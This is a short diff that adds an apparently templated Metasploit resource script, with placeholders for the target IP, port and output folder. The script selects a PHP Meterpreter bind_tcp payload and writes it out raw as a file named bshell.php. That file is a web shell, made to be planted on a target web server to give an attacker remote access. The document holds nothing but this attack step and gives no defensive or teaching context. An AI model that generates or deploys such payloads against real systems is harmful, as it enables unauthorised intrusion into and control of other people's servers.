@@ -1,0 +1,5 @@
+use payload/php/meterpreter/bind_tcp
+set RHOST {{TARGET_IP}}
+set RPORT {{ATTACKER_PORT}}
+
+generate -f raw -o {{OUTPUT_DIRECTORY}}/bshell.php
